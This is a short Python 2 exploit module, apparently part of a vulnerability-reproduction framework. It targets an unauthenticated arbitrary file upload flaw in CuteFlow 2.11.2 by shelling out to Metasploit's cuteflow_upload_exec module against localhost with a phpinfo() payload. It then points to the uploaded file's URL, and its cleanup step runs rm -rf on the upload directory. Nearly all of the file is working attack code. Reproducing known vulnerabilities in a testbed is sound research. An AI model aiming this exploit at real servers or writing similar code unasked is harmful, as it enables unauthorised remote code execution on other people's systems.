import sys
import os
import time

import selenium.common.exceptions
import framework

class Exploit (framework.Exploit):

    attributes = {'Name' :        "OSVDB_84829",
                  'Description' : "CuteFlow v2.11.2 Arbitrary File Upload Vulnerability. "
                                  "This application has an upload feature that allows an "
                                  "unauthenticated user to upload an arbitrary file to the "
                                  "\"upload/___1/\" directory, and then execute it.",
                  'References' :  [['OSVDB', '84829']],
                  'Target' :      "CuteFlow 2.11.2",
                  'VulWikiPage' : "",
                  'Type' : 'EXEC'
                  }

    def __init__(self):
        framework.Exploit.__init__(self)
        return
            
    def exploit(self):
        driver = self.create_selenium_driver()

        metasploit_cmd = "metasploit-framework/msfcli multi/http/cuteflow_upload_exec RHOST=127.0.0.1 TARGETURI=/cuteflow/ PAYLOAD=generic/custom PAYLOADSTR=\'phpinfo();\' E"
        print "Running Metasploit"
        os.system(metasploit_cmd)

        print "To run payload go to http://localhost/cuteflow/uploads/___1/[filename] where [filename] is the random payload filename specified above."
        driver.cleanup()
        return

    def cleanup(self, system_dir):
        print "Removing /var/www/cuteflow/uploads/___1"
        os.system("rm -rf " + system_dir + "/var/www/cuteflow/uploads/___1")
        return
